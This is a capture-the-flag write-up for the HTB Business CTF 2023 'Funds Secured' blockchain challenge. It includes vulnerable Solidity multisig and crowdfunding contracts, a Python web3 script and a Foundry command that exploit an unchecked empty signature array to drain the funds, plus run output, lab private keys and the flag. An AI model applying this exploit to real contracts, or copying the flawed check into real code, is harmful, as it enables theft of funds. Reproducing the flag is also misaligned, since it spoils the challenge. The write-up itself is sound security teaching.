# Funds Secured (Blockchain Challenge)
HTB Business CTF 2023
Writeup by: @godylockz

## Challenge Description
Category: Blockchain
Difficulty: Easy
Points: 1000
In Arodor, a state-of-the-art crowdfunding program fueled groundbreaking research. Powered by a smart contract, the program aimed to raise funds. Overseeing this campaign was a council board, responsible for finalizing the program through a multi-signature wallet scheme. Your goal is to exploit the contract and steal the funds, posing a threat to Arodor's noble scientific mission..

## Challenge Files
Campaign.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {ECDSA} from "./lib/ECDSA.sol";

/// @notice MultiSignature wallet used to end the Crowdfunding and transfer the funds to a desired address
contract CouncilWallet {
    using ECDSA for bytes32;

    address[] public councilMembers;

    /// @notice Register the 11 council members in the wallet
    constructor(address[] memory members) {
        require(members.length == 11);
        councilMembers = members;
    }

    /// @notice Function to close crowdfunding campaign. If at least 6 council members have signed, it ends the campaign and transfers the funds to `to` address
    function closeCampaign(bytes[] memory signatures, address to, address payable crowdfundingContract) public {
        address[] memory voters = new address[](6);
        bytes32 data = keccak256(abi.encode(to));

        for (uint256 i = 0; i < signatures.length; i++) {
            // Get signer address
            address signer = data.toEthSignedMessageHash().recover(signatures[i]);

            // Ensure that signer is part of Council and has not already signed
            require(signer != address(0), "Invalid signature");
            require(_contains(councilMembers, signer), "Not council member");
            require(!_contains(voters, signer), "Duplicate signature");

            // Keep track of addresses that have already signed
            voters[i] = signer;
            // 6 signatures are enough to proceed with `closeCampaign` execution
            if (i > 5) {
                break;
            }
        }

        Crowdfunding(crowdfundingContract).closeCampaign(to);
    }

    /// @notice Returns `true` if the `_address` exists in the address array `_array`, `false` otherwise
    function _contains(address[] memory _array, address _address) private pure returns (bool) {
        for (uint256 i = 0; i < _array.length; i++) {
            if (_array[i] == _address) {
                return true;
            }
        }
        return false;
    }
}

contract Crowdfunding {
    address owner;

    uint256 public constant TARGET_FUNDS = 1000 ether;

    constructor(address _multisigWallet) {
        owner = _multisigWallet;
    }

    receive() external payable {}

    function donate() external payable {}

    /// @notice Delete contract and transfer funds to specified address. Can only be called by owner
    function closeCampaign(address to) public {
        require(msg.sender == owner, "Only owner");
        selfdestruct(payable(to));
    }
}
```
Setup.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {Crowdfunding} from "./Campaign.sol";
import {CouncilWallet} from "./Campaign.sol";

contract Setup {
    Crowdfunding public immutable TARGET;
    CouncilWallet public immutable WALLET;

    constructor() payable {
        // Generate the councilMember array
        // which contains the addresses of the council members that control the multi sig wallet.
        address[] memory councilMembers = new address[](11);
        for (uint256 i = 0; i < 11; i++) {
            councilMembers[i] = address(uint160(i));
        }

        WALLET = new CouncilWallet(councilMembers);
        TARGET = new Crowdfunding(address(WALLET));

        // Transfer enough funds to reach the campaing's goal.
        (bool success,) = address(TARGET).call{value: 1100 ether}("");
        require(success, "Transfer failed");
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

## Strategy
The code below leverages the Web3 Python3 package to communicate with the blockchain and facilitate the exchange of smart contracts. The `Campaign.sol` contract is a crucial component and contains a `closeCampaign()` function. When this function is invoked with an empty `signatures` array (i.e. `[]`) the `Crowdfunding.closeCampaign()` function is called to redirect all funding to any desired wallet. This will lead to the successful completion of the challenge.

## Python Solution Code
```python
#!/usr/bin/env python3

# Imports
from web3 import Web3
from solcx import compile_files
from pwn import *

# Connection settings
provider_address = "http://94.237.62.195:39218"
url = '94.237.62.195'
port = 49645


def launch_instance():
    info('Launch instance...')
    r = remote(url, port)
    r.sendlineafter(b'action? ', b'1')
    r.recvuntil(b'Private key           :  ')
    private_key = r.recvline().strip().decode()
    r.recvuntil(b'Address               :  ')
    player_wallet_address = r.recvline().strip().decode()
    r.recvuntil(b'Crowdfunding contract :  ')
    crowdfunding_contract_address = r.recvline().strip().decode()
    r.recvuntil(b'Wallet contract       :  ')
    wallet_contract_address = r.recvline().strip().decode()
    r.recvuntil(b'Setup contract        :  ')
    setup_contract_address = r.recvline().strip().decode()
    r.close()
    info(f'private_key                    : {private_key}')
    info(f'wallet_address                 : {player_wallet_address}')
    info(f'crowdfunding_contract_address  : {crowdfunding_contract_address}')
    info(f'wallet_contract_address        : {wallet_contract_address}')
    info(f'setup_contract_address         : {setup_contract_address}')
    return private_key, player_wallet_address, crowdfunding_contract_address, wallet_contract_address, setup_contract_address


def kill_instance():
    info('Kill instance...')
    r = remote(url, port)
    r.sendlineafter(b'action? ', b'2')
    r.close()


def get_flag():
    info('Get Flag...')
    r = remote(url, port)
    r.sendlineafter(b'action? ', b'3')
    flag = r.readrepeat(1)
    r.close()
    return flag


# Launch instance
private_key = ''
player_wallet_address = ''
crowdfunding_contract_address = ''
wallet_contract_address = ''
setup_contract_address = ''
if private_key == '':
    private_key, player_wallet_address, crowdfunding_contract_address, wallet_contract_address, setup_contract_address = launch_instance()

# Connect to the network
w3 = Web3(Web3.HTTPProvider(provider_address))
assert w3.is_connected()

# Load the private key
player = w3.eth.account.from_key(private_key)
player_wallet_address = player.address
player_balance = w3.eth.get_balance(player_wallet_address)
info(f'Player Address                 : {player_wallet_address}')
info(f'Player Balance                 : {player_balance} wei')

# Compile the contracts from files
current_dir = os.path.dirname(os.path.abspath(__file__))
campaign_contract_filename = os.path.join(current_dir, "Campaign.sol")
setup_contract_filename = os.path.join(current_dir, "Setup.sol")
compiled_contracts = compile_files(
    [campaign_contract_filename, setup_contract_filename], solc_version="0.8.18", output_values=["bin", "abi"])

# Get the contract interfaces
keys = compiled_contracts.keys()
wallet_contract_interface = compiled_contracts[next((key for key in keys if key.endswith(":CouncilWallet")), None)]
crowdfunding_contract_interface = compiled_contracts[next((key for key in keys if key.endswith(":Crowdfunding")), None)]
setup_contract_interface = compiled_contracts[next((key for key in keys if key.endswith(":Setup")), None)]

# Create a contract instance for the deployed contracts
setup_contract_instance = w3.eth.contract(
    address=setup_contract_address, abi=setup_contract_interface['abi'], bytecode=setup_contract_interface['bin'])
wallet_contract_instance = w3.eth.contract(
    address=wallet_contract_address, abi=wallet_contract_interface['abi'], bytecode=wallet_contract_interface['bin'])
crowdfunding_contract_instance = w3.eth.contract(
    address=crowdfunding_contract_address, abi=crowdfunding_contract_interface['abi'], bytecode=crowdfunding_contract_interface['bin'])

# Generate dummy signatures
dummy_signatures = []

# Submit the transaction to call `closeCampaign()` function
call_function = wallet_contract_instance.functions.closeCampaign([], player_wallet_address, crowdfunding_contract_address).build_transaction(
    {"chainId": w3.eth.chain_id, "nonce": w3.eth.get_transaction_count(player_wallet_address), "from": player_wallet_address})
signed_tx = w3.eth.account.sign_transaction(
    call_function, private_key=private_key)
send_tx = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(send_tx)

# Call the `isSolved()` function to retrieve the value of the flag
assert setup_contract_instance.functions.isSolved().call()

out = get_flag()
success(out.decode())
```

```sh
$ python3 fundsecured.py                                   
[*] Launch instance...
[+] Opening connection to 94.237.62.195 on port 49645: Done
[*] Closed connection to 94.237.62.195 port 49645
[*] private_key                    : 0x2ccfdef9a7690d37898afadeb5ee5fd4b9135a9272b32d7ee3de543bd91de42e
[*] wallet_address                 : 0x325331761bF13B19A3E830F7BBaD88AA1d098386
[*] crowdfunding_contract_address  : 0xEa2b7FF8de4B0b33Aa6A0DDa15a557aF806eeA35
[*] wallet_contract_address        : 0x5893e400a23582F1283E096bE77043D4714d5E53
[*] setup_contract_address         : 0xCb2421b47AAFA7C0e78445afda70679d0e440013
[*] Player Address                 : 0x325331761bF13B19A3E830F7BBaD88AA1d098386
[*] Player Balance                 : 5000000000000000000000 wei
[*] Get Flag...
[+] Opening connection to 94.237.62.195 on port 49645: Done
[*] Closed connection to 94.237.62.195 port 49645
[+] HTB{1_5h0u1d'v3_v411d473d_7h3_4224y}
```

Flag: `HTB{1_5h0u1d'v3_v411d473d_7h3_4224y}`

## Foundry-RS Solution
Another method to solve this challenge is to use [Foundry-RS](https://github.com/foundry-rs/foundry). Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust. 

Send transaction via Foundry-RS(cast)
```sh
$ cast send --rpc-url=<RPC_URL> --private-key=<PRIVATE_KEY> <ENTRANT_CONTRACT_ADDRESS> "<FUNCTION_SIGNATURE>" <ARGUMENTS>
```

```
$ cast send --rpc-url=http://94.237.62.195:39218 --private-key 0x8d09a3c03e06228055cfc8ebb9bb23e65ac11e00e7ffd9dd58221063418b1fa3 0xb949eC84Fb76c7b375e879F978d5cA6a23f4A986 'closeCampaign(bytes[], address, address)' '[]' 0x76776d3466701c9e219F67FfdDF2559bB10e63fE 0xd5052763f2aAD46B62626106C625aF333E8ec6A1 

blockHash               0x843085dbbb5bdc6012a2a04b6807255f72e65d45ff976d5fff664204c9a40346
blockNumber             2
contractAddress         
cumulativeGasUsed       33416
effectiveGasPrice       3000000000
gasUsed                 33416
logs                    []
logsBloom               0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                    
status                  1
transactionHash         0x05aea269c38da078a0b1884907ee2c83fc89562b98da71e169f26b4f9c96447e
transactionIndex        0
type                    2
```

```sh
$ nc 83.136.254.139 42228
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 3
HTB{1_5h0u1d'v3_v411d473d_7h3_4224y}
```

Flag: `HTB{1_5h0u1d'v3_v411d473d_7h3_4224y}`